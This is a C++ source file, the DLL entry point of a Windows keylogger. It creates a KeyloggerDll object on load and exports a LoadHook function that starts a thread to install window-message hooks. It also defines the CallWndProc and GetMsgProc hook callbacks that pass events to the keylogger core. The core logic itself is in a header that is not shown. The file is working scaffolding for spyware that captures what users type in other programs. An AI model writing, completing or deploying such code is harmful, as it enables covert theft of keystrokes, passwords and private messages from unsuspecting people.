// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <sstream>
#include <queue>
#include <exception>

#include "KeyloggerDll.h"

KeyloggerDll *core = NULL;

DWORD WINAPI MainRoutine(LPVOID lpParm)
{
	try {
		core->loadHook();
		core->MessageLoop();
	}
	catch (std::exception &e)
	{
		(void)e;
		//OutputDebugString(e.what());
		OutputDebugStringW(L"This is an exception from MainRoutine !");
	}
	return (0);
}

extern "C" __declspec(dllexport) void LoadHook()
{
	HANDLE hThread;
	DWORD dwThread;

	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MainRoutine, (LPVOID)NULL, NULL, &dwThread);
}

LRESULT CALLBACK CallWndProcFn(
	_In_  int nCode,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
	)
{
	return core->CallWndProc(nCode, wParam, lParam);
}

LRESULT CALLBACK GetMsgProcFn(
	_In_  int code,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
	)
{
	return core->GetMsgProc(code, wParam, lParam);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		core = new KeyloggerDll(hModule);
		OutputDebugStringW(L"ProcessAttach");
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		OutputDebugStringW(L"Detach lol");
		//delete core;
		break;
	}
	return TRUE;
}

